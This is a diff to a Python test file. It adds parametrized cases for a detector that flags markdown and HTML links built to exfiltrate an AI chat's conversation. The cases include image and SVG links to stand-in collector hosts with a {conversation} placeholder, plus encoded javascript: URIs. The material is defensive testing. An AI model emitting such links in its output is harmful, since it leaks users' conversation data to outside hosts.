@@ -235,6 +235,12 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("[send](//collector.test/?q={conversation})", ["exfiltration_query"]),
         ("<a href='https://collector.test/?d=%23{conversation}'>send</a>", ["exfiltration_query"]),
         ("[docs](https://a.test/page#see?q={x})", []),
+        ("\ud800 [docs](https://a.test/) ![a](https://a.test/{c}.png)", ["exfiltration_query"]),
+        ("<svg><image href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
+        ("<svg><feImage xlink:href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
+        ("<a xlink:href='https://api.test/users/{id}'>user</a>", []),
+        ("![foo [bar](javascript:x)](https://a.test/logo.png)", []),
+        ("![see ![inner](https://a.test/{c}.png)](https://a.test/logo.png)", []),
     ],
 )
 def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
@@ -247,7 +253,13 @@ def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
         ("![x](https://a.test/{conversation}.png)", ["exfiltration_query"]),
         ("[a](&#106;avascript:alert(1))", ["script_uri"]),
         ("[b](jav%09ascript:alert(1))", ["script_uri"]),
-        ("see https://docs.test/a and pass {limit}", []),
+        ("see https://docs.test/a and nothing to fill", []),
+        ("![x](https://collector.test/p(1)?d={conversation})", ["exfiltration_query"]),
+        ("![x](https://collector.test/p%28%29?d={conversation})", ["exfiltration_query"]),
+        ("![x](https://[::1]/{conversation}.png)", ["exfiltration_query"]),
+        ("[d](data:text/html,x) ![e](data:image/png;base64,AA)", ["data_uri"]),
+        ("![e](data:image/png;base64,AA)", []),
+        ("\ud800 [q](https://a.test/?q={d})", ["exfiltration_query"]),
     ],
 )
 def test_oversized_text_keeps_image_and_encoded_scheme_checks(tail: str, expected: list[str]) -> None:
